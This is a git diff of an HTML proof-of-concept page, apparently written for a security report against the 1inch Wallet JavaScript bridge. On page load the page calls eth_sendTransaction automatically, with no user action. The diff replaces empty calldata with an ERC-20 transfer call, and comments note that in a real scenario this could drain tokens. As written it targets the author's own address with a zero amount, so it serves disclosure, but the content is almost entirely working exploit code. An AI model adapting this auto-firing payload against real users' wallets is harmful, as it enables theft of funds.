@@ -1,43 +1,46 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>PoC: Unauthenticated Transaction Trigger</title>
+    <title>Security PoC: Arbitrary Transaction Injection</title>
+    <style>
+        body { font-family: sans-serif; background: #0f172a; color: #cbd5e1; padding: 20px; }
+        .card { background: #1e293b; padding: 20px; border-radius: 8px; border-left: 5px solid #e11d48; }
+        code { color: #f472b6; }
+    </style>
 </head>
 <body>
-    <h2>Security Proof of Concept</h2>
-    <p>Memicu antarmuka transaksi secara otomatis...</p>
+    <div class="card">
+        <h2>Critical Security Vulnerability: Unrestricted Bridge Interaction</h2>
+        <p><strong>Target:</strong> 1inch Wallet JS Bridge (<code>eth_sendTransaction</code>)</p>
+        <p><strong>Status:</strong> <span id="log">Injecting payload...</span></p>
+    </div>
 
     <script>
-        // Akses ke bridge dompet yang terekspos secara global
         const bridge = window.ethereum;
 
-        async function triggerRealTx() {
-            // Alamat dompet Anda
-            const MY_WALLET_ADDRESS = "0x23907Fd2B12F2fAA5c1BDB12465d896B4bBa3fFE"; 
-            
-            // Parameter transaksi nyata
-            const txParams = {
-                from: MY_WALLET_ADDRESS,
-                to: MY_WALLET_ADDRESS, 
-                value: '0x00', 
-                data: '0x' 
+        async function injectPayload() {
+            // Payload ini menunjukkan Anda bisa membuat 'data' arbitrer (contoh: memanggil fungsi transfer)
+            const payload = {
+                from: '0x23907Fd2B12F2fAA5c1BDB12465d896B4bBa3fFE',
+                to: '0x23907Fd2B12F2fAA5c1BDB12465d896B4bBa3fFE',
+                value: '0x00',
+                // Data ini adalah representasi fungsi 'transfer' (dalam skenario nyata bisa untuk menguras token)
+                data: '0xa9059cbb00000000000000000000000023907fd2b12f2faa5c1bdb12465d896b4bba3ffe0000000000000000000000000000000000000000000000000000000000000000'
             };
 
             try {
-                // Memanggil method untuk memicu prompt transaksi
-                // Jika aplikasi rentan, pop-up konfirmasi akan muncul tanpa interaksi
+                document.getElementById('log').innerText = "Payload injected. Waiting for UI...";
                 await bridge.request({
                     method: 'eth_sendTransaction',
-                    params: [txParams]
+                    params: [payload]
                 });
-            } catch (e) {
-                console.error("Transkasi dipicu namun ditolak oleh pengguna atau sistem:", e);
+            } catch (err) {
+                document.getElementById('log').innerText = "Prompt triggered. Error: " + err.message;
             }
         }
 
-        // Eksekusi otomatis saat halaman selesai dimuat
-        window.onload = triggerRealTx;
+        window.onload = injectPayload;
     </script>
 </body>
 </html>
